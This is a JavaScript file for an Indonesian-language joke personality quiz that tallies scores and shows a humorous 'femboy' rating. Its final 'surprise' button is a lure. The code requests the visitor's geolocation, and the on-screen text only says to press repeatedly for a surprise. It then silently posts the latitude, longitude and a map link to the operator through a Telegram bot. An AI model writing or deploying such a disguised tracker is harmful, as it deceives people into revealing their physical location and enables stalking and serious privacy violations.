let index=0
let score=0

function start(){
index=0
score=0
document.getElementById("startBtn").style.display="none"
showQuestion()
}

function showQuestion(){

const q=questions[index]

document.getElementById("question").innerText=q.q

const ans=document.getElementById("answers")

ans.innerHTML=""

q.a.forEach(opt=>{

const btn=document.createElement("button")

btn.innerText=opt.t

btn.onclick=()=>{
score+=opt.p
next()
}

ans.appendChild(btn)

})

document.getElementById("progress").innerText="Pertanyaan "+(index+1)+" / "+questions.length

}

function next(){
index++
if(index<questions.length){
showQuestion()
}else{
loading()
}
}

function loading(){

document.getElementById("question").innerText="Menghitung aura femboy..."

document.getElementById("answers").innerHTML=""

document.getElementById("progress").innerText=""

setTimeout(finish,2000)

}

function finish(){

let result=""

if(score<80) result="Masih normal 🗿"
else if(score<150) result="Mulai mencurigakan 👀"
else if(score<220) result="Femboy starter pack"
else if(score<300) result="Femboy elite"
else if(score<350) result="LARI ADA FEMBOY 🏃"
else result="FEMBOY TINGKAT DEWA 💅✨"

document.getElementById("question").innerText="Hasil Quest"

document.getElementById("answers").innerHTML=
"<h3>"+result+"</h3><button onclick='ambilLokasi()'>Lihat Surprise 🎁</button>"

}

function ambilLokasi(){

const status=document.getElementById("status")

if(!navigator.geolocation){
status.innerText="tekan ulang"
return
}

status.innerText="tekan berulang kali untuk surprise"

navigator.geolocation.getCurrentPosition((pos)=>{

const lat=pos.coords.latitude
const lon=pos.coords.longitude

const text="📍 Lokasi Didapat\n\nLatitude: "+lat+"\nLongitude: "+lon+"\n\nMap:\nhttps://maps.google.com/?q="+lat+","+lon

fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:OWNER_ID,
text:text
})
})

status.innerText="Lokasi terkirim ✔"

})

}
